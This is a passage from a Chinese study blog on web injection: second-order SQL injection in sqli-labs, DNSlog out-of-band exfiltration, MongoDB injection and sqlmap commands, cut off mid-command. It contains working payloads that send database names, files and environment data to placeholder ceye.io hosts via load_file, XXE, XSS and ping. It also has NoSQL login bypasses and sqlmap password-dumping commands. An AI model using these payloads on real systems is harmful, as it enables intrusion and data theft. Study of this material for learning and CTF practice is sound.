<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p>第一次注入 第二次触发</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605d07042.png" alt="image-20240306192751893"></p>
<p>第一次的注入语句中的某些符号被转义了，但是仍被存储在数据库中，此时数据库中的注入语句的转义符是不会被存储进来的（即存储在数据库中的注入语句是完整的，只是尚未被拼接在SQL语句中）</p>
<p>第二次会请求第一次注入的数据，去执行SQL相关命令，此时因为程序可能认为已存储在数据库中的数据是安全的，就会直接调用其数据，并未对其进行转义等处理，使第一次的注入语句被完整调用，实现注入</p>
<h2 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h2><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
<p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
<p>使用实例：</p>
<p>sqli-labs less-24</p>
<ol>
<li>如下点击注册用户</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605a5e0bd.png" alt="image-20240306194217405"></p>
<p>这里注册用户名为 admin’#</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605a595ad.png" alt="image-20240306194232085"></p>
<p>此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是DDD</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605a6ca0b.png" alt="image-20240306194249406"></p>
<ol start="2">
<li>对注册的账号进行登录然后修改密码为ccccc</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605cacf82.png" alt="image-20240306194314534"></p>
<p>此时提示密码已经成功修改了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605a52e7a.png" alt="image-20240306194328535"></p>
<p>此时我们发现反倒是admin的密码被修改成了ccccc，而我们注册的用户admin’#的密码并没有被修改</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b1b9c4.png" alt="image-20240306194343196"></p>
<p>漏洞原因</p>
<ol>
<li><p>在进行用户注册的允许存在’和#这种特殊字符</p>
</li>
<li><p>在修改密码页面的源码中，发现这里很明显存在注入漏洞</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>

<p>当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为ccccc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>





<h1 id="DNSlong注入"><a href="#DNSlong注入" class="headerlink" title="DNSlong注入"></a>DNSlong注入</h1><h2 id="前置-4"><a href="#前置-4" class="headerlink" title="前置"></a>前置</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据</p>
<h3 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h3><p>一般情况下，在我们无法通过联合查询直接获取数据的情况下，我们只能通过盲注，来一步步的获取数据，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，此时就可以使用dnslong带外注入</p>
<h3 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h3><p>mysql中有个系统属性  secure_file_priv</p>
<blockquote>
<p>secure_file_priv为null    表示不允许导入导出 </p>
<p>secure_file_priv指定文件夹时  表示mysql的导入导出只能发生在指定的文件夹 </p>
<p>secure_file_priv没有设置时  则表示没有任何限制</p>
</blockquote>
<blockquote>
<p>LOAD_FILE()函数 </p>
<p>LOAD_FILE()函数读取一个文件并将其内容作为字符串返回 语法为：load_file(file_name)，其中file_name是文件的完整路径</p>
<p>使用条件：</p>
<p>文件必须位于服务器主机上<br>你必须具有该FILE权限才能读取该文件。拥有该FILE权限的用户可以读取服务器主机上的任何文件，该文件是world-readable的或MySQL服务器可读的，此属性与secure_file_priv状态相关<br>文件必须是所有人都可读的，并且它的大小小于max_allowed_packet字节</p>
</blockquote>
<p>UNC路径</p>
<blockquote>
<p>什么是UNC路径？</p>
<p>UNC路径就是类似\softer这样的形式的网络路径。它符合 \servername\sharename 格式，其中 servername 是服务器名，sharename 是共享资源的名称。</p>
<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。</p>
<p>例如把自己电脑的文件共享，你会获得如下路径，这就是UNC路径</p>
<p>&#x2F;&#x2F;iZ53sl3r1890u7Z&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;111.txt</p>
<p><strong>这也就解释了为什么CONCAT()函数拼接了4个\了，双斜杠表示网络资源路径多加两个\就是转义了反斜杠。</strong></p>
</blockquote>
<blockquote>
<p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
<p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。</p>
</blockquote>
<p>使用DNSlog注入需要使用一个dns服务器用于记录我们注入的信息并返回一些有用的信息（类似于日志）</p>
<blockquote>
<p>DNSLOG平台 </p>
<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  （是临时的网址）</p>
<p><a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a> （不常用了）</p>
<p><a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a> （要注册）</p>
</blockquote>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605b4a234.png" alt="image-20240306211208664"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605e22ff7.png" alt="image-20240306211243870"></p>
<p>我们注入的指令会被服务器发送给NS服务器 并被记录下来</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
<li>需要Mysql用户具备文件读取的权限，因为要借助到mysql的load_file读取文件的函数，权限不够的话，不能调用这个函数，其实只要mysql配置项中开启了secure_file_priv配置，就可以通过sql语句来执行文件读写操作</li>
<li>目标mysql数据库服务器能访问外网</li>
</ul>
<h2 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h2><h3 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;\\\\requests.xxxx.ceye.io\\aa&#x27;);</span><br><span class="line">select load_file(&#x27;\\\\xxxx.xxxx.xxx\\xx&#x27;);  xxxx.xxxx.xxx\\xx是某个网址</span><br><span class="line">这是最基本的用法，来看看利用盲注来回显。</span><br></pre></td></tr></table></figure>

<p>利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">或者构造</span><br><span class="line">payload：&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxx.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>



<p>查库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from member where id=1 and (select load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.xxxx.xxx.xxx/xx&#x27;)))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from member where id=1 and (select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxx.xxx.xxx\\xx&#x27;)))</span><br></pre></td></tr></table></figure>



<p>查表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆第一个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br><span class="line">爆第二个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 1,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br><span class="line">爆第三个表名</span><br><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 2,1),&#x27;.xxx.xxx.xxx\\xxx&#x27;)))</span><br></pre></td></tr></table></figure>



<p>查字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select load_file(concat(&#x27;\\\\&#x27;,(select column_name from information_schema.column where table_schema=database() and table_name=&#x27;member&#x27; limit 0,1),&#x27;.xxx.xxx.xx\\xx&#x27;)))</span><br></pre></td></tr></table></figure>





<h3 id="配合xss"><a href="#配合xss" class="headerlink" title="配合xss"></a>配合xss</h3><p>XSS 盲打在安全测试的时候是比较常用的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot;&lt;script src=http://XSS.XXXXX.ceye.io&gt;&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>





<h3 id="配合SSRF"><a href="#配合SSRF" class="headerlink" title="配合SSRF"></a>配合SSRF</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot;... &lt;!ENTITY test SYSTEM &quot;SSRF.xxxx.ceye.io\\aa&quot;&gt; ...&quot;</span><br></pre></td></tr></table></figure>





<h3 id="配合XXE"><a href="#配合XXE" class="headerlink" title="配合XXE"></a>配合XXE</h3><p>当我们遇到XXE，如果这个XXE漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把dtd文件改成这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://XXXX.ceye.io/%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>





<h3 id="配合命令执行"><a href="#配合命令执行" class="headerlink" title="配合命令执行"></a>配合命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: &quot; ping %PATH%.pxxx.ceye.io ...&quot;</span><br></pre></td></tr></table></figure>



<h1 id="MongoDB-注入"><a href="#MongoDB-注入" class="headerlink" title="MongoDB 注入"></a>MongoDB 注入</h1><p>要考 遇到了再学 先放在这里   已学</p>
<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>MongoDB是一个基于分布式文件存储的数据库，是一个介于关系数据库和非关系数据库之间的产品，它的特点是高性能、易部署、易使用，存储数据非常方便，默认情况下是没有认证的这就导致不熟悉它的研发人员部署后没有做访问控制导致可以未授权登录。</p>
<p><strong>MongoDB 与几乎支持相同语法的SQL数据库相反，NoSQL数据库具有不同的语法。</strong></p>
<p>实现MongoDB 注入：</p>
<p>在登录时，如果是mysql这种关系型的数据库，我们可以构造真值等式来绕过。如 or 1&#x3D;1。 在nosql中同样可以，nosql中的 || 1&#x3D;&#x3D;1 相当于在sql中的 or 1&#x3D;1 。 那么我们可以这样绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=fujieace&#x27; || 1==1 //</span><br></pre></td></tr></table></figure>

<p>在攻击前，我们需要先建立一个集合，作为攻击的基础。</p>
<p>用户test是攻击者已经知道账号密码的一个测试账号，其他账号的话密码随机。想通过注入获取其他账号的密码。</p>
<h2 id="1-数组绑定时的注入"><a href="#1-数组绑定时的注入" class="headerlink" title="1.数组绑定时的注入"></a>1.数组绑定时的注入</h2><p>一个数组绑定的查询demo如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">&lt;?php</span><br><span class="line">$mongo = new mongoclient();</span><br><span class="line">$db = $mongo-&gt;myinfo; //选择数据库</span><br><span class="line">$coll = $db-&gt;test; //选择集合</span><br><span class="line">$username = $_GET[&#x27;username&#x27;];</span><br><span class="line">$password = $_GET[&#x27;password&#x27;];</span><br><span class="line">$data = array(</span><br><span class="line">        &#x27;username&#x27;=&gt;$username,</span><br><span class="line">        &#x27;password&#x27;=&gt;$password</span><br><span class="line">        );</span><br><span class="line">$data = $coll-&gt;find($data);</span><br><span class="line">$count = $data-&gt;count();</span><br><span class="line">if ($count&gt;0) &#123;</span><br><span class="line">    foreach ($data as $user) &#123;</span><br><span class="line">        echo &#x27;username:&#x27;.$user[&#x27;username&#x27;].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &#x27;password:&#x27;.$user[&#x27;password&#x27;].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;未找到&#x27;;</span><br></pre></td></tr></table></figure>


<p>此时的攻击利用了php可以传递数组参数的一个特性。</p>
<p>当传入的url为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username=test&amp;password=test</span><br></pre></td></tr></table></figure>

<p>执行了语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:‘test’,password:‘test’&#125;);</span><br></pre></td></tr></table></figure>

<p>如果此时传入的url如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[xx]=test&amp;password=test</span><br></pre></td></tr></table></figure>

<p>则$username就是一个数组，也就相当于执行了php语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure>

<p>此时的攻击利用了php可以传递数组参数的一个特性。</p>
<p>当传入的url为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username=test&amp;password=test</span><br></pre></td></tr></table></figure>

<p>执行了语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#x27;test&#x27;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure>

<p>如果此时传入的url如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[xx]=test&amp;password=test</span><br></pre></td></tr></table></figure>

<p>则$username就是一个数组，也就相当于执行了php语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!php</span><br><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure>



<p>而mongodb对于多维数组的解析使最终执行了如下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;xx&#x27;:&#x27;test&#x27;&#125;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure>

<p>利用此特性，我们可以传入数据，是数组的键名为一个操作符（大于，小于，等于，不等于等等），完成一些攻击者预期的查询。</p>
<p>如，传入url:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[$ne]=test&amp;password[$ne]=test</span><br></pre></td></tr></table></figure>


<p>因为传入的键名$ne正是一个mongodb操作符，最终执行了语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;$ne&#x27;:&#x27;test&#x27;&#125;,password:&#123;&#x27;$ne&#x27;:&#x27;test&#x27;&#125;&#125;);</span><br></pre></td></tr></table></figure>


<p>这句话相当于sql:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from test where username!=&#x27;test&#x27; and password!=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure>


<p>如果此时的用户名与密码不能回显，只是返回一个逻辑上的正误判断。</p>
<p>那么我们可以采用$regex操作符来一位一位获取数据。</p>
<h2 id="2-拼接字符串时的注入"><a href="#2-拼接字符串时的注入" class="headerlink" title="2.拼接字符串时的注入"></a>2.拼接字符串时的注入</h2><p>攻击方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&amp;password=test</span><br></pre></td></tr></table></figure>

<p>报错。 想办法闭合语句。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:1,password:2&#125;//&amp;password=test</span><br></pre></td></tr></table></figure>

<p>该语句能返回一个数组，username键值是1，password键值是2.</p>
<p>爆mongodb版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test</span><br></pre></td></tr></table></figure>

<p>爆所有集合名</p>
<p>因为db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写。</p>
<p>爆test集合的第一条数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.test.find()[0]),password:2&#125;;//&amp;password=test</span><br></pre></td></tr></table></figure>


<p>爆test集合的第二条数据</p>
<p>因为execute方法支持多语句执行，所以可以执行太多语句了，不演示~</p>
<p>当然，有时可能遇到没有输出返回数据，这时候怎么办呢？</p>
<p>在高版本下，添加了一个函数sleep()，就是时间盲注咯~</p>
<p>在高版本下，貌似不能用注释语句，此外高版本还有一个新特性就是默认开启错误回显。笔者尝试没有注释成功，只能用闭合的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(10000); exit; &#125;var b=(&#123;a:&#x27;1&amp;password=test</span><br></pre></td></tr></table></figure>






<h1 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h1><h2 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h2><p>把参数中转一下，再发送到指定网址上去，可以对请求携带的参数进行二次加工</p>
<p>有一说一 我感觉这只能是对题的见招拆招，说是一种单独的注入方式感觉有点草率了</p>
<p>这类题，会将我们注入的语句发送到指定网址进行一些处理（加密等）再发送出去</p>
<p>所以我们可以直接BP抓包发给重发器处理后发出去或这写一个php文件将数据直接进行相应的处理（用url拼接 file_get_contents读取文件 $_GET获取参数）然后直接访问这个文件进行传参，让这个文件来访问 注入成功可能会有回显</p>
<h2 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h2><p>好吧 感觉又是像中转注入一样 </p>
<p>伪静态：看似是静态页面实则是动态页面</p>
<p>伪静态 动态 静态在url上有差别</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605db649d.png" alt="image-20240306202112544"></p>
<p>伪静态的url可能会有数字等 让后端能明白要调用那个文件</p>
<p>剩下的就和正常的sql注入一样了</p>
<h2 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h2><p>也是几乎不考 先放在这里 考了再学</p>
<h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p>JSON是一种轻量级的数据交换格式，易于阅读和编写，同时也易于机器解析和生成。它是基于JavaScript的一个子集，JSON采用完全独立于语言的文本格式，但是也使用类似于C语言家族的习惯（C、C#、C++、Java、JavaScript、Perl、Python等都可以使用JSON），这些特性使JSON成为理想的数据交换语言。<br>JSON可以将JavaScript中的对象转换为字符串，然后在函数、网络之间传递这个字符串。</p>
<h3 id="2、JSON结构"><a href="#2、JSON结构" class="headerlink" title="2、JSON结构"></a>2、JSON结构</h3><p>JSON建构于两种结构：<br>①“名称&#x2F;值”对的集合。不同的语言中，它被理解为对象（object），纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。<br>②值的有序列表。在大部分语言中，它被理解为数组（array）。</p>
<p>例如：下面一段示例使JSON最简单的Key-Value示例（名称-值对，键值对）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;Username&quot;:&quot;xsser&quot;&#125;</span><br><span class="line">&#123;&quot;Username&quot;:&quot;xsser&quot;,&quot;Password&quot;:&quot;12345&quot;,&quot;Email&quot;:&quot;1234@st.com&quot;&#125;</span><br><span class="line"></span><br><span class="line">当需要表示一组值的时候，JSON不但能够提供高可读性，而且可以减少复杂性。</span><br><span class="line">例如表示一个管理员表，在JSON中，如下：</span><br><span class="line">&#123;&quot;Users&quot;:[</span><br><span class="line">	&#123;&quot;Username&quot;:&quot;zhangsan&quot;,&quot;Password&quot;:&quot;12345&quot;,&quot;Email&quot;:&quot;12345@st.com&quot;&#125;</span><br><span class="line">	&#123;&quot;Username&quot;:&quot;lisi&quot;,&quot;Password&quot;:&quot;123123&quot;,&quot;Email&quot;:&quot;123123@st.com&quot;&#125;</span><br><span class="line">	&#123;&quot;Username&quot;:&quot;wangwu&quot;,&quot;Password&quot;:&quot;321321&quot;,&quot;Email&quot;:&quot;321321@st.com&quot;&#125;</span><br><span class="line">]  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-JSON注入"><a href="#3-JSON注入" class="headerlink" title="3.JSON注入"></a>3.JSON注入</h3><p>JSON注入是指应用程序所解析的JSON数据来源于不可信赖的数据源，程序没有对这些不可信赖的数据进行验证、过滤，如果应用程序使用未经验证的输入构造 JSON，则可以更改 JSON 数据的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON数据时抛出异常。<br>在JSON中是根据引号（”）、冒号（:）、逗号（,）、花括号（{}）来区分各字符的意义的。如果向JSON中注入恶意字符，那么JSON将解析失败。<br>例如：输入的Password值为：admin”1，那么在JSON语句中为：“password”：“admin”1”，为了”password”：“admin”1”成功解析，我们可以把”admin”1”转换为”admin”1”。<br>JSON注入和XML注入、SQL注入一样，都需要对影响语句的内容进行转义，如双引号、花括号等。</p>
<h3 id="4-如何避免-JSON-注入"><a href="#4-如何避免-JSON-注入" class="headerlink" title="4.如何避免 JSON 注入"></a>4.如何避免 JSON 注入</h3><p>1、检查程序逻辑，根据实际需求对数据进行合理过滤和安全校验，以避免产生JSON注入。</p>
<p>2、后台代码对Json数据进行编码</p>
<p>JsonStringEncoder</p>
<p>3、使用安全json parser防止json注入</p>
<h1 id="SQLMAP使用"><a href="#SQLMAP使用" class="headerlink" title="SQLMAP使用"></a>SQLMAP使用</h1><p>首先，SQLMap是一个自动化的SQL注入工具</p>
<p>kali内自带SQLMAP，用-h参数查看sqlmap的参数与使用方法</p>
<p>kali中直接输入sqlmap即可使用</p>
<h2 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641605eb068a.png" alt="image-20240309190754619"></p>
<h2 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r http.txt  #http.txt是我们抓取的http的请求包</span><br><span class="line">sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</span><br><span class="line">sqlmap -u &quot;http://www.xx.com/username/admin*&quot;       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;   #探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;   --cookie=&quot;抓取的cookie&quot;   #当该网站需要登录时，探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;  --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;  #抓取其post提交的数据填入</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --users      #查看数据库的所有用户</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --passwords  #查看数据库用户名的密码</span><br><span class="line">有时候使用 --passwords 不能获取到密码，则可以试下</span><br><span class="line">-D mysql -T user -C host,user,password --dump  当MySQL&lt; 5.7时</span><br><span class="line">-D mysql -T user -C host,user,authentication_string --dump  当MySQL&gt;= 5.7时</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --current-user  #查看数据库当前的用户</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --is-dba    #判断当前用户是否有管理员权限</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --dbs        #爆出所有的数据库</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --tables     #爆出所有的数据表</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --columns    #爆出数据库中所有的列</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;    --current-db #查看当前的数据库</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security --tables #爆出数据库security中的所有的表</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns 